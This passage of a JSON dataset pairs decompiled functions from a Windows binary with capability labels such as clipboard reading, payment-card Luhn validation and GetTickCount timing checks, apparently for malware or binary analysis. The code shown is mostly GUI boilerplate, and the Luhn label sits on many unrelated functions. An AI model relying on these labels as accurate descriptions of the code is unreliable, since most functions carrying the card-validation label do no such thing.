            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043190c(uint param_1, uint32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x431920;\n    (**(*in_EAX + 0x18))();\n    uStack24 = 0x431950;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData();\n    *in_FS_OFFSET = param_2 & 0xffff;\n    uStack24 = 0x431957;\n    uStack28 = 0x43194f;\n    (**(*in_EAX + 0x14))();\n    return;\n}\n",
        "token_count": 210
    },
    "00431bf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00431bf8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0044a594();\n    *(in_EAX + 0x60) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 148
    },
    "0043233c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043233c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0043228c();\n    (***0x495a8c)(uVar1);\n    return;\n}\n",
        "token_count": 91
    },
    "00432388": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432388(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0043228c();\n    (***0x495a44)(uVar1);\n    return;\n}\n",
        "token_count": 77
    },
    "00432898": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432898(char param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    uint uStack116;\n    uint *puStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint uStack92;\n    uint uStack88;\n    int32_t var_44h;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint var_34h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    int32_t var_18h;\n    int32_t iStack24;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hdc;\n    uint var_4h;\n    \n    uStack88 = 0xffffffec;\n    uStack92 = 0x4328b2;\n    var_4h = param_2;\n    uStack92 = fcn.00458594();\n    puStack96 = 0x4328b8;\n    uVar1 = sub.user32.dll_GetWindowLongA();\n    if ((uVar1 & 0x200) != 0) {\n        puStack96 = &fcn.00432898::nLeftRect;\n        uStack100 = 0x4328cd;\n        uStack100 = fcn.00458594();\n        iStack104 = 0x4328d3;\n        sub.user32.dll_GetWindowRect();\n        iStack104 = -nTopRect;\n        iStack108 = -nLeftRect;\n        puStack112 = &fcn.00432898::nLeftRect;\n        uStack116 = 0x4328e8;\n        sub.user32.dll_OffsetRect();\n        uStack116 = 0x4328f0;\n        uStack116 = fcn.00458594();\n        puStack120 = 0x4328f6;\n        hdc = sub.user32.dll_GetWindowDC();\n        uStack124 = 0x4329f3;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        var_18h = nLeftRect;\n        iStack24 = nTopRect;\n        var_10h = nRightRect;\n        var_ch = nBottomRect;\n        puStack120 = &stack0xfffffffc;\n        if (param_1 != '\\0') {\n            puStack120 = &stack0xfffffffc;\n            uVar2 = fcn.00458594(0xfffffff0);\n            uVar1 = sub.user32.dll_GetWindowLongA(uVar2);\n            if (((uVar1 & 0x100000) != 0) && ((uVar1 & 0x200000) != 0)) {\n                sub.user32.dll_GetSystemMetrics(2);\n                sub.user32.dll_GetSystemMetrics(3);\n                sub.user32.dll_InflateRect(&fcn.00432898::var_18h, 0xfffffffe, 0xfffffffe);\n                fcn.00418464(&fcn.00432898::var_44h, var_ch);\n                var_18h = var_44h;\n                iStack24 = iStack68;\n                var_10h = iStack64;\n                var_ch = iStack60;\n                uVar2 = sub.user32.dll_GetSysColorBrush(0xf);\n                sub.user32.dll_FillRect(hdc, &fcn.00432898::var_18h, uVar2);\n            }\n        }\n        sub.gdi32.dll_ExcludeClipRect(hdc, nLeftRect + 2, nTopRect + 2, nRightRect + -2, nBottomRect + -2);\n        fcn.00432434();\n        uVar2 = 0;\n        fcn.00432388(0, &fcn.00432898::nLeftRect);\n        *in_FS_OFFSET = uVar2;\n        uVar2 = fcn.00458594(hdc, 0x4329fa);\n        sub.user32.dll_ReleaseDC(uVar2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 947
    },
    "00434780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00434780(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x70) != 0) && (cVar1 = fcn.004047dc(),  cVar1 != '\\0')) {\n        fcn.00437128();\n        fcn.00437610();\n    }\n    if (*(in_EAX + 0x70) != 0) {\n        fcn.0043837c();\n    }\n    fcn.00433f24();\n    return;\n}\n",
        "token_count": 131
    },
    "004355b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004355b3(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    int32_t lprc;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint uStack00000008;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    *in_EAX = *in_EAX | in_EAX;\n    if (*in_EAX == 0) {\n        *(*(unaff_EBP + 8) + -0x20) = *(*(unaff_EBP + 8) + -0x18);\n        *(*(unaff_EBP + 8) + -0x18) = *(*(unaff_EBP + 8) + -0x54) + -10;\n        lprc = *(unaff_EBP + 8) + -0x20;\n        uVar1 = *(*(unaff_EBP + 8) + -0x29);\n        arg_8h_00 = 2;\n        fcn.00433adc();\n        fcn.00434a80(arg_8h_00, uVar1, lprc);\n    }\n    *in_FS_OFFSET = unaff_retaddr;\n    uStack00000008 = 0x435621;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 326
    },
    "00436140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436140(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_154h;\n    uint var_bch;\n    uint var_b8h;\n    \n    var_154h = 0x154;\n    iVar1 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_154h, 0);\n    if (iVar1 != 0) {\n        **(arg_8h + -4) = var_bch;\n        **(arg_8h + 8) = var_b8h;\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00436f24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436f24(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    (**(**(arg_8h + -8) + 8))();\n    uVar1 = (**(**(arg_8h + -0xc) + 0x14))();\n    *(arg_8h + -0x10) = uVar1;\n    iVar2 = (**(**(arg_8h + -0x14) + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            uVar1 = (**(**(arg_8h + -0x14) + 0x18))();\n            (**(**(arg_8h + -0x14) + 0x18))(uVar1);\n            (**(**(arg_8h + -8) + 0x3c))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.004055c8();\n    return;\n}\n",
        "token_count": 235
    },
    "004379c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.004379c0(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00433f24();\n    return 0;\n}\n",
        "token_count": 63
    },
    "00437cfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.00437cfc(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    iVar1 = sub.user32.dll_GetKeyState(0xa5);\n    uVar3 = 0;\n    if ((iVar1 < 0) && (iVar2 = sub.user32.dll_GetKeyboardLayout(0),  uVar3 = *0x4934ec,  iVar2 != *0x4934e8)) {\n        fcn.00437b58();\n        *0x4934e8 = iVar2;\n        uVar3 = *0x4934ec;\n    }\n    return uVar3;\n}\n",
        "token_count": 148
    },
    "00437d38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00437d38(void)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    uint32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = *in_EAX;\n    uVar1 = in_EAX[1];\n    uVar3 = uVar1 & 0xff;\n    if (uVar1 != 0) {\n        iVar2 = sub.user32.dll_GetKeyState(0x10, uVar4, uVar1, in_EAX[2], in_EAX[3]);\n        if (iVar2 < 0) {\n            uVar3 = uVar1 + 0x2000;\n        }\n        iVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (iVar2 < 0) {\n            uVar3 = uVar3 + 0x4000;\n        }\n        if ((uVar4 & 0x20000000) != 0) {\n            uVar3 = uVar3 + 0x8000;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 251
    },
    "004390ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004390ec(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    \n    uVar1 = param_2[1];\n    *(in_EAX + 0x58) = *param_2;\n    *(in_EAX + 0x5c) = uVar1;\n    return;\n}\n",
        "token_count": 86
    },
    "0043b8bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043b8bc(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x493524;\n    puStack32 = &stack0xfffffffc;\n    puStack44 = &stack0xfffffffc;\n    *0x493524 = 0;\n    uStack36 = 0x43b96d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    *0x493520 = 1;\n    uStack48 = 0x43b92f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    uVar2 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0043b86c, 0);\n    sub.user32.dll_EnumThreadWindows();\n    *in_FS_OFFSET = uVar2;\n    *in_FS_OFFSET = uStack52;\n    *0x493520 = 0;\n    *0x493524 = uVar1;\n    return;\n}\n",
        "token_count": 292
    },
    "0043bad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate gui resources"
        ],
        "decompiled_code": "\nuint64_t fcn.0043bad0(void)\n\n{\n    char in_AL;\n    uint uVar1;\n    code *pcVar2;\n    uint uStack12;\n    uchar uStack8;\n    \n    uStack12 = sub.user32.dll_GetActiveWindow();\n    uStack8 = 0;\n    if (in_AL == '\\0') {\n        pcVar2 = fcn.0043ba78;\n        uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0043ba78, &uStack12);\n        sub.user32.dll_EnumThreadWindows(uVar1);\n    }\n    else {\n        pcVar2 = fcn.0043ba98;\n        sub.user32.dll_EnumWindows(fcn.0043ba98, &uStack12);\n    }\n    return CONCAT44(pcVar2, pcVar2) & 0xffffffff000000ff;\n}\n",
        "token_count": 191
    },
    "0043bd3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0043bd3c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x43bdad;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    iVar1 = fcn.0043bd2c();\n    if (iVar1 == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.00407550();\n        fcn.0040db40(in_stack_ffffffd4, arg_ch);\n        fcn.00404ec4();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x43bdb4;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 290
    },
    "0043bdbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043bdbc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 0x18) = arg_8h;\n    *(in_EAX + 10) = 0x50;\n    *(in_EAX + 8) = 8;\n    *(in_EAX + 0x1c) = 1;\n    *(in_EAX + 0x20) = 10;\n    *(in_EAX + 0x40) = 4;\n    *(in_EAX + 0x3c) = 0xc;\n    *(in_EAX + 0x28) = 0xff000014;\n    *(in_EAX + 0x2c) = 1;\n    *(in_EAX + 0x44) = 1;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 324
    },
    "0043c95c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043c95c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.004534d0();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x43c9d0;\n    uVar1 = fcn.0043bdbc(0);\n    *(in_EAX + 0x250) = uVar1;\n    uVar2 = 1;\n    uVar1 = fcn.0043bdbc(1);\n    *(in_EAX + 0x254) = uVar1;\n    *(in_EAX + 600) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 255
    },
    "0043cd48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043cd48(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_stack_ffffffd0;\n    int32_t iVar6;\n    int32_t in_stack_ffffffd4;\n    int32_t iVar7;\n    int32_t in_stack_ffffffd8;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    if (param_2 != NULL) {\n        (**(*param_2 + 0x44))();\n        uVar1 = *(*(in_EAX + 0x250) + 0x1a);\n        uVar2 = *(*(in_EAX + 0x254) + 0x1a);\n        fcn.004502c0(in_stack_ffffffd0 - uVar1, in_stack_ffffffd4 - uVar2, in_stack_ffffffd8 + uVar1, \n                     in_stack_ffffffdc + uVar2);\n        fcn.00450370();\n        iVar5 = iStack32;\n        iVar7 = iStack28;\n        fcn.004502c0();\n        fcn.00450370();\n        if (iVar5 < 0) {\n            fcn.0043c5b8();\n        }\n        else {\n            iVar6 = iVar5;\n            iVar3 = fcn.004501ac();\n            if (iVar3 < iStack32) {\n                iVar3 = iStack32;\n                iVar4 = fcn.004501ac();\n                if (iVar4 < iStack32 - iVar5) {\n                    iVar3 = fcn.004501ac();\n                    iVar3 = iVar3 + iVar6;\n                }\n                fcn.004501ac(iVar6, iVar7, iVar3);\n                fcn.0043c5b8();\n            }\n        }\n        if (iVar7 < 0) {\n            fcn.0043c5b8();\n        }\n        else {\n            iVar5 = fcn.004501f0();\n            if (iVar5 < iStack28) {\n                iVar5 = fcn.004501f0();\n                if (iVar5 < iStack28 - iVar7) {\n                    fcn.004501f0();\n                }\n                fcn.004501f0();\n                fcn.0043c5b8();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 566
    },
    "0043cf68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043cf68(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    in_EAX[0x97] = in_EAX[0x97] + 1;\n    uStack24 = 0x43cfd4;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.004569e4();\n    (**(*in_EAX + 0xe0))();\n    *in_FS_OFFSET = uStack28;\n    in_EAX[0x97] = in_EAX[0x97] + -1;\n    return;\n}\n",
        "token_count": 180
    },
    "0043d120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d120(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = *(param_2 + 4);\n    uStack24 = 0x43d181;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    var_8h = param_2;\n    cVar1 = fcn.004047dc();\n    if (cVar1 == '\\0') {\n        *(var_8h + 4) = 1;\n    }\n    fcn.004578e0();\n    *in_FS_OFFSET = uStack28;\n    *(var_8h + 4) = var_ch;\n    return;\n}\n",
        "token_count": 220
    },
    "0043d1b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043d1b0(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffea4;\n    uint *arg_ch;\n    uint uStack340;\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uchar *puStack316;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10h;\n    uint var_ch;\n    int32_t *var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack304 = 0x43d1ce;\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uStack308 = 0x43d314;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec8;\n    puStack316 = 0x43d1f0;\n    puStack304 = &stack0xfffffffc;\n    var_5h._0_1_ = param_2;\n    unique0x100000eb = in_EAX;\n    (**(***0x495cec + 0x14))();\n    uStack320 = 0x43d2f4;\n    uStack324 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffebc;\n    uStack328 = 0;\n    puStack332 = 0x43d20f;\n    puStack316 = &stack0xfffffffc;\n    (**(*stack0xfffffff8 + 0xf0))();\n    puStack332 = 0x43d217;\n    iVar2 = fcn.00404528();\n    if ((iVar2 != *0x43a284) && ((*(stack0xfffffff8 + 7) & 0x10) == 0)) {\n        *(stack0xfffffff8 + 0xd6) = *(stack0xfffffff8 + 0xd6) | 1;\n        uStack336 = 0x43d2bc;\n        uStack340 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffeac;\n        puStack332 = &stack0xfffffffc;\n        cVar1 = fcn.00419674();\n        if (cVar1 == '\\0') {\n            fcn.00404530();\n            var_10h = &fcn.0043d1b0::var_110h;\n            var_ch._0_1_ = 4;\n            arg_ch = &fcn.0043d1b0::var_10h;\n            in_stack_fffffea4 = 0;\n            fcn.00407550();\n            fcn.0040db40(in_stack_fffffea4, arg_ch);\n            fcn.00404ec4();\n        }\n        *in_FS_OFFSET = in_stack_fffffea4;\n        *(stack0xfffffff8 + 0xd6) = *(stack0xfffffff8 + 0xd6) & 0xfe;\n        return;\n    }\n    *in_FS_OFFSET = uStack328;\n    uStack320 = 0x43d2fb;\n    uStack324 = 0x43d2f3;\n    (**(***0x495cec + 0x18))();\n    return;\n}\n",
        "token_count": 790
    },
    "0043e1d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e1d4(code *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00458afc(arg_8h, arg_ch);\n    if ((in_EAX == in_EDX) && (var_8h = fcn.004205b0(),  -1 < var_8h + -1)) {\n        do {\n            fcn.00420584();\n            cVar1 = fcn.0040484c();\n            if (cVar1 == '\\0') {\n                (*arg_8h)();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00441ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441ec0(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    \n    uVar1 = (*in_EAX + in_ECX) - in_EDX;\n    uVar2 = uVar1 >> 0x1f;\n    if ((uVar1 ^ uVar2) - uVar2 < *(*(arg_8h + -4) + 0x34c)) {\n        *in_EAX = in_EDX - in_ECX;\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00442aa8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00442aa8(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x442b15;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    cVar1 = (**(*in_EAX + 0xf4))();\n    if (cVar1 != '\\0') {\n        fcn.0040484c();\n        if ((cVar1 != '\\0') == true) {\n            fcn.00442c1c();\n        }\n    }\n    else {\n        in_EAX[0xa5] = 0;\n    }\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 202
    },
    "0044378c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044378c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    iVar1 = fcn.00456f48();\n    *arg_8h = iVar1 == 0;\n    return;\n}\n",
        "token_count": 66
    },
    "00443a08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00443a08(void)\n\n{\n    uint uStack20;\n    \n    fcn.00443a70();\n    return uStack20;\n}\n",
        "token_count": 35
    },
    "00443a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00443a20(void)\n\n{\n    int32_t iStack16;\n    int32_t iStack8;\n    \n    fcn.00443a70();\n    return iStack8 - iStack16;\n}\n",
        "token_count": 51
    },
    "00443a3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00443a3c(void)\n\n{\n    uint uStack16;\n    \n    fcn.00443a70();\n    return uStack16;\n}\n",
        "token_count": 36
    },
    "00443a54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00443a54(void)\n\n{\n    int32_t iStack20;\n    int32_t iStack12;\n    \n    fcn.00443a70();\n    return iStack12 - iStack20;\n}\n",
        "token_count": 51
    },
    "00443a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443a70(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    \n    uStack52 = 0x28;\n    (***0x49594c)(*(in_EAX + 4));\n    *param_2 = &uStack52;\n    *(param_2 + 4) = uStack52;\n    *(param_2 + 8) = uStack48;\n    *(param_2 + 0xc) = uStack44;\n    return;\n}\n",
        "token_count": 136
    },
    "00443aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443aa0(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint auStack52 [3];\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    auStack52[0] = 0x28;\n    (***0x49594c)(*(in_EAX + 4), auStack52);\n    *param_2 = uStack40;\n    param_2[1] = uStack36;\n    param_2[2] = uStack32;\n    param_2[3] = uStack28;\n    return;\n}\n",
        "token_count": 148
    },
    "00444244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00444244(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint auStack28 [3];\n    \n    puVar7 = auStack28;\n    if (param_2 != *(in_EAX + 0x44)) {\n        *(in_EAX + 0x44) = param_2;\n        if (param_2 == 0) {\n            sub.user32.dll_GetCursorPos(auStack28);\n            uVar1 = sub.user32.dll_WindowFromPoint(puVar7, auStack28[0]);\n            if (uVar1 != 0) {\n                iVar6 = 0;\n                uVar4 = uVar1;\n                iVar2 = sub.user32.dll_GetWindowThreadProcessId(uVar1, 0);\n                iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n                if (iVar2 == iVar3) {\n                    uVar4 = sub.user32.dll_SendMessageA(uVar1, 0x84, 0, uVar4 & 0xffff | iVar6 << 0x10);\n                    sub.user32.dll_SendMessageA(uVar1, 0x20, uVar1, uVar4 & 0xffff | 0x2000000);\n                    return;\n                }\n            }\n        }\n        uVar5 = fcn.0044421c();\n        sub.user32.dll_SetCursor(uVar5);\n    }\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) + 1;\n    return;\n}\n",
        "token_count": 392
    },
    "00444464": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
